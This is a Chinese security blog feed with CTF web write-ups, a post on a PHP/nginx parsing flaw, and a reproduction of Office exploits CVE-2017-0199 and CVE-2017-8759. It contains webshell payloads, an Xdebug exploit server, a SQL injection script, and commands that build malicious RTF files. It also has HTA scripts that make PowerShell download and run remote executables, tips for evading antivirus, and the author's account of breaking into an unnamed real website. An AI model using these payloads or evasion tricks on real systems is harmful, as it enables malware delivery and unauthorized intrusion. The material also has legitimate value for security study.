class="code"><pre><div class="line">$keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;];</div><div class="line">$uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]);</div><div class="line">parse_str($uri[&apos;query&apos;], $query);</div></pre></td></tr></table></figure><p>通过构造 <a href="http://47.52.152.93:20000////user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg" target="_blank" rel="external">http://47.52.152.93:20000////user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg</a>  即可获得下个提示信息（好像又是非预期。。。）之后在上传函数的流程中发现 上传文件名处存在命令注入，直接构造把数据库导出就可以获取flag。。</p><p><code>mysqldump -uroot -pNu1LCTF2018\!@#qwe --all-databases &gt; flagggggggg.png</code> (对不起，我就是这么暴力。。。</p><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy php"></a>easy php</h2><p>两个非预期解法。</p><p>第一个是通过包含session文件，利用 <code>PHP_SESSION_UPLOAD_PROGRESS</code>控制session内容，成功达成命令执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;form action=&quot;http://47.52.246.175:23333/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</div><div class="line"> &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?=`echo &apos;&lt;?php eval(\$_REQUEST[winter3un])?&gt;&apos;&gt;gg.php`?&gt;&quot; /&gt;</div><div class="line"> &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt;</div><div class="line"> &lt;input type=&quot;submit&quot; /&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure><p>第二个是通过xdebug</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl --url http://112.213.118.106/?XDEBUG_SESSION_START=1</div></pre></td></tr></table></figure><p>exp 脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"><span class="keyword">from</span> socketserver <span class="keyword">import</span> BaseRequestHandler, TCPServer</div><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</div><div class="line">php_code = <span class="string">b"print_r(file_put_contents('/var/www/html/cmd.php','&lt;?=`$_GET[a]`?&gt;'), true)"</span></div><div class="line">payload = <span class="string">b"""eval -i 105 -- %s"""</span> % b64encode(php_code)</div><div class="line"><span class="keyword">if</span> len(payload) % <span class="number">304</span> != <span class="number">0</span>:</div><div class="line">    payload = payload + <span class="string">b'\x00'</span> * (<span class="number">304</span> - len(payload) % <span class="number">304</span>)</div><div class="line">count = <span class="number">0</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">EchoHandler</span><span class="params">(BaseRequestHandler)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">global</span> count</div><div class="line">        print(<span class="string">'Got connection from'</span>, self.client_address)</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            msg = self.request.recv(<span class="number">8192</span>)</div><div class="line">            print(msg)</div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> msg:</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">if</span> count == <span class="number">0</span>:</div><div class="line">                self.request.send(payload)</div><div class="line">            count += <span class="number">1</span></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    serv = TCPServer((<span class="string">''</span>, <span class="number">9000</span>), EchoHandler)</div><div class="line">    serv.serve_forever()</div></pre></td></tr></table></figure><h2 id="harder-php"><a href="#harder-php" class="headerlink" title="harder php"></a>harder php</h2><p>之后出题人修复了非预期的解法，正常解法流程如下。</p><p>1、备份文件源代码泄漏，通过代码审计，找到留言处存在sql注入漏洞。</p><p>2、利用该sql注入漏洞，获取管理员密码。</p><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">`,0x12345)%23</div></pre></td></tr></table></figure></p><p>3、管理员登录需要本地IP<code>127.0.0.1</code> ,根据提示反序列化导致ssrf，谷歌搜索，第一篇文章即是 《PHP Unserialize Exploiting》（<a href="https://www.slideshare.net/MailRuGroup/security-meetup-22-php-unserialize-exploiting）" target="_blank" rel="external">https://www.slideshare.net/MailRuGroup/security-meetup-22-php-unserialize-exploiting）</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://www.youtube.com/watch?v=5AdVQzUB6iM</div><div class="line">SSRF Unserializing SoapClient can provide SSRF with CRLF injection. O:10:&quot;SoapClient&quot;:3:&#123;s:3:&quot;uri&quot;;s:18:&quot;http://hostname/3%0a1&quot;; s:8:&quot;location&quot;;s:23:&quot;http://hostname/123&quot;;s:13:&quot; _soap_version&quot;;i:1;&#125;</div></pre></td></tr></table></figure></p><p>4、其user-agent参数可以CRLF注入，伪造<code>http request</code>头，从而达成post任意参数的ssrf，利用该ssrf获取管理员登录后的session。</p><p>5、利用管理员登录后的session，上传php文件，但是有个坑，<code>stripos(file_get_contents($move_to_file),&#39;&lt;?php&#39;)&gt;=0</code> 这个表达式是恒返回0的。也就是说，不管怎么样都会触发<code>rm /app/*</code></p><p>6、通过搜索引擎查询<code>rm * 无法删除文件</code>，查询到，当文件名前缀为<code>-x</code>时，必须用 <code>rm -- *</code> 才能删除，故上传文件名为<code>-x1234</code>的php一句话木马，再通过http response返回的时间戳来爆破文件名（文件夹所属是root，权限333），爆破成后即可getshell</p><h2 id="baby-sqli"><a href="#baby-sqli" class="headerlink" title="baby sqli"></a>baby sqli</h2><p>题目太坑，注入点在个签那里，条件判断在头像那边。。</p><p>当时没做出，给个官方脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"># -*- coding:utf-8 -*- </div><div class="line">import requests</div><div class="line">from random import Random</div><div class="line">def random_str(randomlength=8):</div><div class="line">    str = &apos;&apos;</div><div class="line">    chars = &apos;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789&apos;</div><div class="line">    length = len(chars) - 1</div><div class="line">    random = Random()</div><div class="line">    for i in range(randomlength):</div><div class="line">        str+=chars[random.randint(0, length)]</div><div class="line">    return str</div><div class="line">dic=&apos;0123456789_@:.abcdefghijklmnopqrstuvwxyz&apos;</div><div class="line">url=&quot;http://47.98.51.5/vlogin/reg.php&quot;</div><div class="line">table_name=&apos;&apos;</div><div class="line">def register(email,uinfo):</div><div class="line">url=&quot;http://47.98.51.5/vlogin/reg.php&quot;</div><div class="line">data=&#123;</div><div class="line">&quot;email&quot;:email,</div><div class="line">&quot;pass&quot;:&quot;123&quot;,</div><div class="line">&quot;userinfo&quot;:userinfo</div><div class="line">&#125;</div><div class="line">requests.post(url=url,data=data)</div><div class="line">def login(loginuser):</div><div class="line">url=&quot;http://47.98.51.5/vlogin/login.php&quot;</div><div class="line">a=requests.session()</div><div class="line">data2=&#123;</div><div class="line">&quot;loginuser&quot;:loginuser,</div><div class="line">&quot;loginpass&quot;:&quot;123&quot;</div><div class="line">&#125;</div><div class="line">a.post(url=url,data=data2)</div><div class="line">url3=&quot;http://47.98.51.5/vlogin/vpage/index.php&quot;</div><div class="line">b=a.get(url3)</div><div class="line">return b.text</div><div class="line">for i in range(1,100):</div><div class="line">for j in dic:</div><div class="line">email=random_str(randomlength=8)+&quot;@1.com&quot;</div><div class="line">userinfo=&quot;&apos;or(if(1,(select(substr((select(user())),&#123;&#125;,1))=&apos;&#123;&#125;&apos;),1)=1)#&quot;.format(i,j)</div><div class="line">register(email,userinfo)</div><div class="line">c=login(email)</div><div class="line">if &quot;1.png&quot; in c:</div><div class="line">table_name += j</div><div class="line">print table_name</div><div class="line">break</div><div class="line">print table_name</div></pre></td></tr></table></figure><h2 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h2><p><a href="http://netsecurity.51cto.com/art/201702/531607.htm" target="_blank" rel="external">http://netsecurity.51cto.com/art/201702/531607.htm</a>    一种新的MySQL下Update、Insert注入方法</p><p><a href="https://www.anquanke.com/post/id/84837" target="_blank" rel="external">https://www.anquanke.com/post/id/84837</a>   题目2 无人机病了（Web）</p><p><a href="https://www.restran.net/2017/09/16/php-xdebug-cmd-exec/" target="_blank" rel="external">https://www.restran.net/2017/09/16/php-xdebug-cmd-exec/</a>   PHP Xdebug 远程调试命令执行分析</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;因为工作上涉及到web知识的比较多，所以作为pwn选手，这次并没有关注pwn的任何一题题目。。反倒是把web题做了个一遍ORZ&lt;/p&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>低版本php+nginx 解析漏洞</title>
    <link href="https://winter3un.github.io/2018/02/20/2018-2-21/"/>
    <id>https://winter3un.github.io/2018/02/20/2018-2-21/</id>
    <published>2018-02-21T07:20:42.000Z</published>
    <updated>2018-02-21T07:27:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>事情要从某个午后说起，那时我正在日一个xx站，这个站nginx版本是<code>1.6.2</code>，php版本是<code>5.3.3</code>，开了<code>GPC</code>，我反复折腾了几天下来，有了数据库权限，有了任意文件下载，但是审了半天源码下来，审不出一个shell来，很绝望地上传了一个图片马，后面加了个<code>/.php</code>访问，它。。竟然执行了！？<br><img src="/2018/02/20/2018-2-21/5.png" alt="5.png" title=""></p><a id="more"></a><img src="/2018/02/20/2018-2-21/6.png" alt="6.png" title=""><p>它怎么能执行？？不是小于&lt;= 0.8.37么，这nginx版本咋能执行？？？</p><p><strong>下图来自wooyun</strong></p><img src="/2018/02/20/2018-2-21/2.jpg" alt="2.jpg" title=""><p>这和说好的不一样喂？？？？<br><img src="/2018/02/20/2018-2-21/1.jpg" alt="1.jpg" title=""></p><p>群里吐槽了一番后ing，发现。。。这解析漏洞并不是nginx造成的问题，是因为php啊。。。。</p><img src="/2018/02/20/2018-2-21/4.png" alt="4.png" title=""><img src="/2018/02/20/2018-2-21/3.jpg" alt="3.jpg" title=""><p>php版本 <code>&lt;= 5.3.9</code>的时候（之后版本里有<code>security.limit_extensions</code>配置限制），配合<code>nginx</code>（无论版本多高），在默认配置下（<code>cgi.fix_pathinfo</code>全版本php默认配置为开启），存在php解析漏洞。</p><p>元凶是php.ini中的<code>cgi.fix_pathinfo</code>，nginx完成一次助攻。。。</p><img src="/2018/02/20/2018-2-21/5.jpg" alt="5.jpg" title=""><p>由于这个解析漏洞被官方认为是特性而不是漏洞，所以没有cve。。。。</p><p>btw：在本机测试的时候，发现phpstudy全版本nginx+php存在这个解析漏洞。。。。这应该算是意外的惊喜。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="http://drops.xmd5.com/static/drops/papers-539.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/papers-539.html</a>  解析漏洞总结</p><p><a href="http://www.laruence.com/2010/05/20/1495.html" target="_blank" rel="external">http://www.laruence.com/2010/05/20/1495.html</a>  Nginx + PHP CGI的一个可能的安全漏洞</p><p><a href="http://www.cnblogs.com/buffer/archive/2011/07/24/2115552.html" target="_blank" rel="external">http://www.cnblogs.com/buffer/archive/2011/07/24/2115552.html</a>  PHP CGI 中 fix_pathinfo 引起的安全隐患</p><p><a href="https://taobig.org/?p=650" target="_blank" rel="external">https://taobig.org/?p=650</a>   php.ini中的cgi.fix_pathinfo选项</p><p><a href="https://bugs.php.net/bug.php?id=55181" target="_blank" rel="external">https://bugs.php.net/bug.php?id=55181</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h2&gt;&lt;p&gt;事情要从某个午后说起，那时我正在日一个xx站，这个站nginx版本是&lt;code&gt;1.6.2&lt;/code&gt;，php版本是&lt;code&gt;5.3.3&lt;/code&gt;，开了&lt;code&gt;GPC&lt;/code&gt;，我反复折腾了几天下来，有了数据库权限，有了任意文件下载，但是审了半天源码下来，审不出一个shell来，很绝望地上传了一个图片马，后面加了个&lt;code&gt;/.php&lt;/code&gt;访问，它。。竟然执行了！？&lt;br&gt;&lt;img src=&quot;/2018/02/20/2018-2-21/5.png&quot; alt=&quot;5.png&quot; title=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>对cve-2017-0199与cve-2017-8759的浅析</title>
    <link href="https://winter3un.github.io/2017/10/29/cve-2017-office/"/>
    <id>https://winter3un.github.io/2017/10/29/cve-2017-office/</id>
    <published>2017-10-29T12:41:52.000Z</published>
    <updated>2018-03-14T04:32:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先说一下为什么偏偏选了这两个cve来复现+分析，其实是因为这两个cve复现比较容易，而且是目前apt团体主要用于apt打击的工具，而且于我个人而言，也是第一次分析word漏洞（当然这两个只是word的逻辑漏洞，并不是溢出漏洞，相对来说比较容易分析）。</p><p>没想到的是分析这两个漏洞的过程并不是一帆风顺，甚至可以说是坑坑洼洼了ORZ。也为了后人的学习以及自己将来的学习，故写下这篇文章。</p><a id="more"></a><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="victimer"><a href="#victimer" class="headerlink" title="victimer"></a>victimer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">os:10.0.14393 default Build 14393</div><div class="line">office:ver2010(14.0.4760.1000)</div><div class="line">.net:v4.0.30319</div></pre></td></tr></table></figure><p>ps:查看.net版本（资源管理器打开<code>%systemroot%\Microsoft.NET\Framework</code>,最高版本即是）</p><h3 id="attacker"><a href="#attacker" class="headerlink" title="attacker"></a>attacker</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python:2.7.14</div></pre></td></tr></table></figure><h2 id="cve-2017-0199"><a href="#cve-2017-0199" class="headerlink" title="cve-2017-0199"></a>cve-2017-0199</h2><p>该漏洞影响版本如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Microsoft Office 2016</div><div class="line">Microsoft Office 2013</div><div class="line">Microsoft Office 2010</div><div class="line">Microsoft Office 2007</div></pre></td></tr></table></figure><p>这个漏洞出在word对已经插入的远程对象访问的时候，如果访问的时候http相应头重含有<code>Content-Type: application/hta</code>那么将会对该对象以脚本的方式解析执行。具体的过程如图所示<br><img src="/2017/10/29/cve-2017-office/1.png" alt="1.png" title=""></p><p>脚本：<a href="https://github.com/bhdresh/CVE-2017-0199" target="_blank" rel="external">https://github.com/bhdresh/CVE-2017-0199</a></p><p>在实验过程中，发现该脚本有几处坑，一个是<code>server_thread</code>函数写了两遍,还有一个是<code>open</code>函数缺少了一个参数，故而本人修改了这两处问题，修改后的代码放于github上。</p><p>使用方式和原来的脚本没有大的区别 <a href="https://github.com/Winter3un/cve_2017_0199" target="_blank" rel="external">https://github.com/Winter3un/cve_2017_0199</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">method 1 分发exe可执行文件并执行：</div><div class="line">1) Generate malicious RTF file</div><div class="line">python cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://192.168.1.125/demo.rtf</div><div class="line">2) Start toolkit in exploit mode to deliver local payload</div><div class="line">python cve-2017-0199_toolkit.py -M exp -t RTF -e http://192.168.1.125/shell.exe -l shell.exe</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">method 2 分发hta脚本并执行：</div><div class="line">1) Generate malicious RTF file</div><div class="line">python cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://192.168.1.125/demo.rtf</div><div class="line">2) Start toolkit in exploit mode to deliver custom HTA file</div><div class="line">python cve-2017-0199_toolkit.py -M exp -t RTF -H custom.hta</div></pre></td></tr></table></figure><p>ps：虚拟机win7+office2010 未成功，不知道为啥。。</p><h2 id="cve-2017-8759"><a href="#cve-2017-8759" class="headerlink" title="cve-2017-8759"></a>cve-2017-8759</h2><p>这个漏洞其实是出在.net模块，但是是通过word或者写字板作为媒介引发的。漏洞原因是开发者没有考虑到输入点会存在换行符，导致了单行注释绕过。我们可以将存在换行符的.net代码发送过去绕过单行注释，进行.net代码执行。这个漏洞危害还是挺大的，与office无关，几乎影响所有版本的.net框架<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Microsoft .NET Framework 4.6.2</div><div class="line">Microsoft .NET Framework 4.6.1</div><div class="line">Microsoft .NET Framework 3.5.1</div><div class="line">Microsoft .NET Framework 4.7</div><div class="line">Microsoft .NET Framework 4.6</div><div class="line">Microsoft .NET Framework 4.5.2</div><div class="line">Microsoft .NET Framework 3.5</div><div class="line">Microsoft .NET Framework 2.0 SP2</div></pre></td></tr></table></figure></p><p>脚本来自: <a href="https://github.com/Winter3un/cve_2017_8759" target="_blank" rel="external">https://github.com/Winter3un/cve_2017_8759</a>  生成exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python3 CreateRTF.py -f 1.rtf -u http://127.0.0.1:8080/exp.txt</div></pre></td></tr></table></figure><p>开启服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -m SimpleHTTPServer 8080</div></pre></td></tr></table></figure><h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><p>免杀主要参考了<code>剖析RTF文件中的Anti-Analysis技术</code>这篇文章</p><p>1) 不完整的RTF头部</p><p>2）奇怪的16进制数</p><p>3）在16进制数中插入额外的空格</p><p>4）16进制编码数据中的虚假RTF控制字</p><p>5）在16进制数据中包含二进制数据</p><p>但是目前来说，这五种方式做的免杀都会被主流杀软干掉，样本hash：<code>b7f67029abc6e44e860fb13313a2b8024c59f200d3680c5dfd2886c9f3bcfc54</code></p><p>virustotal检出率<code>21/59</code>，目前没有啥好的办法可以绕过杀软。</p><h2 id="hta脚本相关"><a href="#hta脚本相关" class="headerlink" title="hta脚本相关"></a>hta脚本相关</h2><p>最简<br><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">a=<span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>);</div><div class="line">a.run(<span class="comment">'%windir%\\System32\\cmd.exe /c calc.exe', 0);window.close();</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p><p>powershell代码执行</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;script language=<span class="string">"VBScript"</span>&gt;</div><div class="line"><span class="keyword">Sub</span> window_onload</div><div class="line"><span class="keyword">const</span> impersonation = <span class="number">3</span></div><div class="line"><span class="keyword">Const</span> HIDDEN_WINDOW = <span class="number">12</span></div><div class="line"><span class="keyword">Set</span> Locator = <span class="built_in">CreateObject</span>(<span class="string">"WbemScripting.SWbemLocator"</span>)</div><div class="line"><span class="keyword">Set</span> Service = Locator.ConnectServer()</div><div class="line">Service.Security_.ImpersonationLevel=impersonation</div><div class="line"><span class="keyword">Set</span> objStartup = Service.<span class="keyword">Get</span>(<span class="string">"Win32_ProcessStartup"</span>)</div><div class="line"><span class="keyword">Set</span> objConfig = objStartup.SpawnInstance_</div><div class="line"><span class="keyword">Set</span> Process = Service.<span class="keyword">Get</span>(<span class="string">"Win32_Process"</span>)</div><div class="line"><span class="keyword">Error</span> = Process.Create(<span class="string">"powershell.exe -nop -w hidden calc.exe"</span>, <span class="literal">null</span>, objConfig, intProcessID)</div><div class="line">window.close()</div><div class="line"><span class="keyword">end</span> <span class="keyword">sub</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure><p>powershell下载远程exe并执行</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">a=<span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>);</div><div class="line">a.run(<span class="comment">'%SystemRoot%/system32/WindowsPowerShell/v1.0/powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\'http://192.168.1.125/shell.exe\', \'c:/windows/temp/shell.exe\'); c:/windows/temp/shell.exe', 0);window.close();</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;script language=<span class="string">"VBScript"</span>&gt;</div><div class="line"><span class="keyword">Sub</span> window_onload</div><div class="line">    window.resizeTo <span class="number">0</span>,<span class="number">0</span></div><div class="line">    window.MoveTo <span class="number">-100</span>,<span class="number">-100</span></div><div class="line"><span class="keyword">const</span> impersonation = <span class="number">3</span></div><div class="line"><span class="keyword">Const</span> HIDDEN_WINDOW = <span class="number">12</span></div><div class="line"><span class="keyword">Set</span> Locator = <span class="built_in">CreateObject</span>(<span class="string">"WScript.Shell"</span>)</div><div class="line">    Locator.Run<span class="string">"powershell.exe -nop -w hidden -c ""IEX (new-object net.webclient).downloadstring('http://192.168.211.149:80/artifact.exe')"""</span>,<span class="number">0</span>,<span class="literal">FALSE</span></div><div class="line">    window.close()</div><div class="line"><span class="keyword">end</span> <span class="keyword">sub</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure><p>以上脚本都能在我的github上找到</p><h2 id="参考文档："><a href="#参考文档：" class="headerlink" title="参考文档："></a>参考文档：</h2><p>对CVE-2017-0199的一次复现过程与内网穿透的利用：<a href="https://zhuanlan.zhihu.com/p/26522540?utm_medium=social&amp;utm_source=weibo" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/26522540?utm_medium=social&amp;utm_source=weibo</a><br>OFFICE OLE2LINK（CVE-2017-0199）漏洞利用详解：<a href="http://www.freebuf.com/articles/system/131969.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/131969.html</a><br>CVE-2017-0199漏洞复现：<a href="http://www.hackersb.cn/hacker/228.html" target="_blank" rel="external">http://www.hackersb.cn/hacker/228.html</a><br>一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现：最新的Office高级威胁攻击预警：<a href="http://www.freebuf.com/articles/system/147602.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/147602.html</a><br>CVE-2017-8759 微软word漏洞复现以及利用：<a href="http://www.cnblogs.com/deen-/p/7532078.html" target="_blank" rel="external">http://www.cnblogs.com/deen-/p/7532078.html</a><br>CVE-2017-8759完美复现.并且解决HTA,POWERSHELL弹框闪烁：<a href="http://www.lz1y.cn/?p=799" target="_blank" rel="external">http://www.lz1y.cn/?p=799</a><br>最新CVE-2017-8759漏洞复现的两种姿势：<a href="https://bbs.77169.com/forum.php?mod=viewthread&amp;tid=364738" target="_blank" rel="external">https://bbs.77169.com/forum.php?mod=viewthread&amp;tid=364738</a><br>剖析RTF文件中的Anti-Analysis技术：<a href="http://www.freebuf.com/articles/terminal/102018.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/102018.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;首先说一下为什么偏偏选了这两个cve来复现+分析，其实是因为这两个cve复现比较容易，而且是目前apt团体主要用于apt打击的工具，而且于我个人而言，也是第一次分析word漏洞（当然这两个只是word的逻辑漏洞，并不是溢出漏洞，相对来说比较容易分析）。&lt;/p&gt;
&lt;p&gt;没想到的是分析这两个漏洞的过程并不是一帆风顺，甚至可以说是坑坑洼洼了ORZ。也为了后人的学习以及自己将来的学习，故写下这篇文章。&lt;/p&gt;
    
    </summary>
    
    
      <category term="cve" scheme="https://winter3un.github.io/tags/cve/"/>
    
      <category term="office" scheme="https://winter3un.github.io/tags/office/"/>
    
  </entry>
  
  <entry>
    <title>810线下赛复盘</title>
    <link href="https://winter3un.github.io/2017/08/16/2017-8-10/"/>
    <id>https://winter3un.github.io/2017/08/16/2017-8-10/</id>
    <published>2017-08-16T16:32:29.000Z</published>
    <updated>2017-08-17T17:05:27.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><strong>将atoi_got修改成printf_plt，威力无穷~</strong></p><p>线下赛只有一个pwn题，但这一个pwn题却出的非常好，虽然防御机制没有全开，但是考察点非常之多，就其中一个漏洞的利用，就考察了如下五个知识点。</p><ul><li>string overflow</li><li>int overflow</li><li>off by one</li><li>race condition</li><li>heap overlay </li><li>fmt</li></ul><a id="more"></a><h3 id="第一个漏洞"><a href="#第一个漏洞" class="headerlink" title="第一个漏洞"></a>第一个漏洞</h3><p>第一个漏洞出现在west模块，该模块可以创建最多两个house，初始的金币都为5（虽然有一个tricks，但是然并软），然后可以选择其中一个house的id购买weapon，若其中一个house的weapon比另一个强，就可以将另一个house消灭掉（free），那么我们怎么才能增加我们的金币数目呢，其实我们可以利用string overflow的方式，如下代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">fgets(&amp;s1, 0x16, stdin);</div><div class="line">v9 = 0xA;</div><div class="line">if ( strlen(&amp;s1) &gt; 0x10 )</div><div class="line">&#123;</div><div class="line">puts(&quot;Your name is too long!&quot;);</div><div class="line">exit(-1);</div><div class="line">&#125;</div><div class="line">str_cpy(0x28LL * (signed int)i + 0x605148, (__int64)&amp;s1);</div></pre></td></tr></table></figure><p>s1可以输入0x16个字节，而string函数都以<code>&#39;\x00&#39;</code>字节定义字符串的结束，我们可以构造绕过，将money覆盖成一个最大数<code>0x7fffffff</code>,即可买我们想要的任何装备，接着漏洞出现在<code>snprintf</code>处，该函数的返回值由原本要复制到<code>dst addr</code> 的数据长度决定，故而这边存在一个溢出，我们只要让返回值大于<code>0x54</code>即可，<code>int overflow</code>刚好能够做到这件事。接着利用刚才获取的长度溢出一个字节（只能达到一个字节，故而我们可以利用<code>off by one</code>技术将指向soliders的指针位置上移），接着利用heap overlay技术将该上移的指针加入到unsorted 